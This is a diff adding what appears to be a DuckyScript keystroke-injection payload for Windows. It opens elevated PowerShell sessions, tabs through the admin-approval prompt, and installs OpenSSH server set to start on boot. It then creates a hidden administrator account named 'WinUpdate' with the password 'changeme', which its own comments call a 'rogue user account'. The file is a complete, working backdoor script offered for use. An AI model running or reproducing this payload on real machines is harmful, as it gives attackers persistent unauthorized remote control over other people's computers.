@@ -1,0 +1,41 @@
+REM Create an administrator privileged user named "WinUpdate" with the password "changeme" using Powershell
+REM Step 1 - Open Powershell as administrator
+GUI r
+DELAY 1000
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 1000
+ENTER
+DELAY 5000
+TAB
+DELAY 1500
+TAB
+DELAY 1500
+ENTER
+REM Step 2 - Install openssh server and make it persistent after reboot
+DELAY 5000
+STRING Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 ; Start-Service sshd ; Set-Service -Name sshd -StartupType Automatic
+DELAY 1000
+ENTER
+REM Step 3 - While ssh is installing, another terminal is opened
+GUI r
+DELAY 1000
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 1000
+ENTER
+DELAY 5000
+TAB
+DELAY 2000
+TAB
+DELAY 2000
+ENTER
+DELAY 5000
+REM Step 4 - Now the rogue user account will be created
+STRING $Password = Read-Host -AsSecureString
+DELAY 1000
+ENTER
+STRING changeme
+DELAY 1000
+ENTER
+STRING New-LocalUser "WinUpdate" -Password $Password -FullName "Other User" -AccountNeverExpires ; Add-LocalGroupMember -Member "WinUpdate" -Group 'Administrators'
+DELAY 1000
+ENTER
